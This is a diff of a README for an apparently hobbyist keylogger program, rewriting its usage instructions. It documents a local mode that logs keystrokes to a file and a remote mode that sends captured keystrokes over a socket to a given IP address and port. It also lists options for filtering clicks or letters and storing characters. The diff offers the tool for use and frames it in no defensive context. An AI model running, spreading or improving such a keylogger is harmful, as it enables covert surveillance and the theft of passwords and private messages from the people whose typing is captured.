@@ -12,30 +12,25 @@ run command make
 
 This program propose 2 types of keylogger
 
-## Local
+##[REQUIERED] Parameters : Please, choose one of them
 
-Store entry into file on the current computer
+        -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)
+                Example : ./bin/main.exe -l D:\file.txt
 
-./bin/main.exe -l destionation_file
+        -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
+                Example : ./bin/main.exe -r 192.168.1.16 7777
 
-Example
+##[OPTIONAL] Options
 
-```
-  ./bin/main.exe -l D:\\test.txt
-```
+        -c | --no_click : don't store click keys (based on ascii)
+                Example : ./bin/main.exe ... -c
 
-## Remote (Not functionnal)
+        -a | --alphabet_only : Store alphabet only, A-z (based on ascii)
+                Example : ./bin/main.exe ... -a
 
-Send entry to another computer
+        -C | --store_character : Default store is int value, use this option if you want to store with character
+                Example : ./bin/main.exe ... -C
 
-./bin/main.exe -r ip_address port
+        -h | --help : print this help
+                Example : ./bin/main.exe -h
 
-Example
-
-```
-  ./bin/main.exe -r 192.168.1.16 7777
-```
-
-TODO
-
-## Parameters
